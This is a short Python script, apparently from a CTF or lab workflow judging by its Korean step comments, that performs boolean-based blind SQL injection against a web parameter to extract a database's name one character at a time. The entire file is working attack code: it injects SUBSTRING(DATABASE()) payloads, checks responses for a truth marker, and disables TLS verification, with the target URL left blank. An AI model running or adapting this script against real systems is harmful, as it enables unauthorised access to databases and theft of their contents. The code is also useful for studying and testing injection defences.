import requests
import string

URL = ""
PARAM = ""
TRUE_INDICATOR = "" 

def send_payload(payload):
    r = requests.get(URL, params={PARAM: payload}, verify=False)
    return r.text

def is_true(payload):
    html = send_payload(payload)
    return TRUE_INDICATOR in html

def get_db_name(length):
    db_name = ""
    # 사용할 문자셋 (필요하면 대문자/특수문자 추가)
    charset = string.ascii_lowercase + string.digits + "_"
    for i in range(1, length+1):
        for c in charset:
            payload = f"x' OR SUBSTRING(DATABASE(),{i},1)='{c}'-- -"
            if is_true(payload):
                db_name += c
                print(f"[+] Found char {i}: {c}  => {db_name}")
                break
    return db_name

if __name__ == "__main__":
    db_length = 9  # 1단계 코드 실행 결과 넣기
    db_name = get_db_name(db_length)
    print(f"[+] Database name: {db_name}")
